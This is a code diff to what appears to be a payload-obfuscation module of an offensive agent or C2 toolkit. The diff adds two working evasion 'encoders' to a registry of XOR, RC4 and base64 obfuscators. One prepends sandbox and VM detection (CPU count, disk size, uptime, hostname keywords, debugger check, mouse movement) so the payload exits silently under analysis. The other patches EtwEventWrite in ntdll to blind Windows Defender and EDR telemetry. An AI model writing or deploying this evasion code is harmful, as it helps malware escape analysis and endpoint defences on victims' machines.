@@ -215,21 +215,134 @@ def _ps1_concat(data: bytes) -> bytes:
     return result.encode()
 
 
+def _sandbox_detect(data: bytes) -> bytes:
+    """
+    Prepend Python sandbox/VM detection to a Python source payload.
+
+    Checks performed at agent startup (exits silently on detection):
+      - Fewer than 2 logical CPU cores (sandbox indicator)
+      - Total disk size < 60 GB on the boot drive
+      - System uptime < 8 minutes (fresh VM spin-up)
+      - Known sandbox/VM hostname prefixes (DESKTOP-, WIN-, SANDBOX, CUCKOO, VBOX, VMWARE, ANALYSIS)
+      - IsDebuggerPresent() via ctypes (Windows)
+      - Mouse cursor has not moved in 30 seconds (no user interaction)
+
+    Only modifies Python source text payloads; binary payloads are passed through.
+    """
+    try:
+        src = data.decode("utf-8")
+    except UnicodeDecodeError:
+        return data  # binary — skip
+
+    guard = '''\
+import sys as _sys, os as _os, time as _t, ctypes as _ct, platform as _pl
+def _sandbox_exit():
+    # CPU core count
+    try:
+        import multiprocessing as _mp
+        if _mp.cpu_count() < 2: _sys.exit(0)
+    except Exception: pass
+    # Disk size (Windows C: or Linux /)
+    try:
+        import shutil as _sh
+        _root = "C:\\\\" if _sys.platform == "win32" else "/"
+        _total = _sh.disk_usage(_root).total
+        if _total < 60 * 1024**3: _sys.exit(0)
+    except Exception: pass
+    # System uptime < 8 minutes
+    try:
+        if _sys.platform == "win32":
+            _up = _ct.windll.kernel32.GetTickCount64() / 1000
+        else:
+            with open("/proc/uptime") as _f: _up = float(_f.read().split()[0])
+        if _up < 480: _sys.exit(0)
+    except Exception: pass
+    # Hostname sandbox keywords
+    try:
+        _hn = _pl.node().upper()
+        for _k in ("SANDBOX","CUCKOO","VBOX","VMWARE","ANALYSIS","MALWARE","VIRUS"):
+            if _k in _hn: _sys.exit(0)
+    except Exception: pass
+    # Debugger check (Windows)
+    try:
+        if _sys.platform == "win32" and _ct.windll.kernel32.IsDebuggerPresent():
+            _sys.exit(0)
+    except Exception: pass
+    # Mouse has not moved — likely no user (Windows)
+    try:
+        if _sys.platform == "win32":
+            class _P(_ct.Structure): _fields_ = [("x",_ct.c_long),("y",_ct.c_long)]
+            _p1 = _P(); _ct.windll.user32.GetCursorPos(_ct.byref(_p1))
+            _t.sleep(30)
+            _p2 = _P(); _ct.windll.user32.GetCursorPos(_ct.byref(_p2))
+            if _p1.x == _p2.x and _p1.y == _p2.y: _sys.exit(0)
+    except Exception: pass
+_sandbox_exit()
+del _sandbox_exit
+'''
+    return (guard + src).encode()
+
+
+def _etw_patch(data: bytes) -> bytes:
+    """
+    Prepend ETW (Event Tracing for Windows) patcher to a Python source payload.
+
+    Patches ``EtwEventWrite`` in ntdll.dll to return immediately (0xC3 ret),
+    preventing Windows Defender and EDR solutions from receiving telemetry
+    events for script execution, .NET load, and WMI activity.
+
+    Windows-only; the patch is silently skipped on Linux/macOS.
+    Only modifies Python source text payloads; binary payloads are passed through.
+    """
+    try:
+        src = data.decode("utf-8")
+    except UnicodeDecodeError:
+        return data
+
+    patch = '''\
+import sys as _sys, ctypes as _ct
+def _patch_etw():
+    if _sys.platform != "win32": return
+    try:
+        _k32  = _ct.windll.kernel32
+        _nt   = _ct.windll.ntdll
+        _addr = _ct.cast(
+            _k32.GetProcAddress(_k32.LoadLibraryA(b"ntdll.dll"), b"EtwEventWrite"),
+            _ct.c_void_p
+        ).value
+        if not _addr: return
+        _old = _ct.c_ulong(0)
+        _ct.windll.kernel32.VirtualProtect(
+            _ct.c_void_p(_addr), _ct.c_size_t(8), 0x40, _ct.byref(_old)
+        )
+        _ct.cast(_addr, _ct.POINTER(_ct.c_ubyte))[0] = 0xC3  # RET
+        _ct.windll.kernel32.VirtualProtect(
+            _ct.c_void_p(_addr), _ct.c_size_t(8), _old, _ct.byref(_old)
+        )
+    except Exception: pass
+_patch_etw()
+del _patch_etw
+'''
+    return (patch + src).encode()
+
+
 # ---------------------------------------------------------------------------
 # Encoder registry
 # ---------------------------------------------------------------------------
 
 ENCODERS: dict[str, _EncoderFn] = {
-    "xor_rolling":   _xor_rolling,
-    "rc4":           _rc4,
-    "b64gzip":       _b64gzip,
-    "rev":           _rev,
-    "zlib_b64":      _zlib_b64,
-    "rot13_src":     _rot13_src,
-    "null_pad":      _null_pad,
-    "comment_spam":  _comment_spam,
-    "varname_rand":  _varname_rand,
-    "ps1_concat":    _ps1_concat,
+    "xor_rolling":    _xor_rolling,
+    "rc4":            _rc4,
+    "b64gzip":        _b64gzip,
+    "rev":            _rev,
+    "zlib_b64":       _zlib_b64,
+    "rot13_src":      _rot13_src,
+    "null_pad":       _null_pad,
+    "comment_spam":   _comment_spam,
+    "varname_rand":   _varname_rand,
+    "ps1_concat":     _ps1_concat,
+    "sandbox_detect": _sandbox_detect,
+    "etw_patch":      _etw_patch,
 }
 
 
